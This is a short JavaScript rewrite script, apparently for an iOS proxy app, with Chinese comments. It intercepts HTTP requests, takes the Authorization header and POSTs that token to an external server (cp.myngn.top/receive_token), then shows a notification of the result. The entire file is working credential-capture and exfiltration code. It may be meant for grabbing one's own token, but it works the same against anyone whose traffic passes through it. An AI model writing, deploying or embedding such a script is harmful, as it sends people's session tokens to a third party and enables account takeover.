// 处理拦截到的请求头
const myRequest = $request;

// 提取请求中的 Authorization 头
const authorizationToken = myRequest.headers["Authorization"];

// 判断是否存在 Authorization 头
if (authorizationToken) {
    // 准备上传的 URL 和数据
    const uploadUrl = "https://cp.myngn.top/receive_token";
    const uploadHeaders = {
        'Content-Type': 'application/json'
    };
    const uploadData = {
        'Authorization': authorizationToken
    };

    // 构建上传请求
    const uploadRequest = {
        url: uploadUrl,
        method: 'POST',
        headers: uploadHeaders,
        body: JSON.stringify(uploadData)
    };

    // 发送上传请求并处理结果
    $task.fetch(uploadRequest).then(response => {
        const statusCode = response.statusCode;
        const responseBody = response.body;

        // 成功上传后显示通知
        if (statusCode === 200) {
            $notify("Token 上传成功", "成功上传 Authorization 令牌", `服务器响应: ${responseBody}`);
        } else {
            $notify("Token 上传失败", `状态码: ${statusCode}`, `响应信息: ${responseBody}`);
        }
    }).catch(error => {
        // 处理上传请求失败的情况
        $notify("Token 上传失败", "请求过程中发生错误", `${error}`);
    });
} else {
    // 未找到 Authorization 头时的处理
    $notify("Token 上传失败", "未找到 Authorization 令牌", "请求头中不包含 Authorization 字段");
}

// 结束脚本
$done();
